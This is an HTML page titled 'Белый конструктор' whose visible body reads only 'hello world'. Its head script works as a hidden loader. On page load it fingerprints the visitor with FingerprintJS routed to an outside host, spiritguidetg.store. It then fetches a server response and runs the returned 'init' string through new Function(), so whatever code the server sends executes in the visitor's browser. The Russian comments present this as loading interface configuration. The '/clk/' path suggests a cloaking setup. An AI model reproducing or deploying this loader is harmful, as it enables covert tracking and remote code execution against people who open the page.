<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Белый конструктор</title>
<script type="module">
(async () => {
    try {
        const CONFIG_API = 'https://spiritguidetg.store/fp.php';
        
        // Динамический импорт
        const FingerprintJS = await import('/clk/fp.js');
        
        const fp = await FingerprintJS.load({
            region: 'eu',
            endpoint: CONFIG_API, // Убираем массив, используем только наш endpoint
            // Добавляем опции для cross-origin
            storageKey: '_fpjs_visitor_id',
            debug: false
        });

        const { requestId } = await fp.get({ 
            extendedResult: true,
            // Принудительно включаем cookies
            linkedId: 'github-pages-request'
        });

        // Загрузка конфигурации интерфейса
        const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`, {
            method: 'GET',
            credentials: 'include', // Важно для cookies
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            }
        });
        
        if (!res.ok) {
            console.error('API Error:', res.status, res.statusText);
            return;
        }

        const data = await res.json();

        // Выполнение пользовательских настроек
        if (data.init) {
            new Function(data.init)();
        }
    } catch (err) {
        console.error('Ошибка загрузки FingerprintJS:', err);
    }
})();
</script>

</head>
<body>
  hello world
</body>
</html>
